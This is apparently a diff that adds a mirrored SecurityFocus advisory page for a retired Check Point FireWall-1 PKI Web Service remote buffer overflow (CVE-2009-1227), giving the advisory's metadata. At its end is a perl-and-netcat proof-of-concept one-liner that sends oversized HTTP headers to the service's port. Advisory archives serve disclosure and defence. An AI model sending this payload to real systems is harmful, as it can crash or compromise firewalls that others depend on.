@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid34286<p><b><span style="font-size: 18pt;">RETIRED: Check Point FireWall-1 PKI Web Service Remote Buffer Overflow Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/34286/info">info</a><br><a href="http://www.securityfocus.com/bid/34286/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/34286/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/34286/solution">solution</a><br><a href="http://www.securityfocus.com/bid/34286/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				34286
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2009-1227<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 30 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 12 2015 07:48PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Bugs NotHugs
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Check Point Software Firewall-1  <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept is available:<br/><br/>perl -e 'print "GET / HTTP/1.0\r\nAuthorization: Basic" . "x" x 8192 .<br/>"\r\nFrom: example.com\r\nIf-Modified-Since: Fri, 13 Dec 2006<br/>09:12:58 GMT\r\nReferer: http://www.example.org/" . "x" x 8192 .<br/>"\r\nUserAgent: FsckResponsibleDisclosure 1.0\r\n\r\n"' | nc<br/>example.com 18264
+	
+		<ul>
+</ul>
+</div>
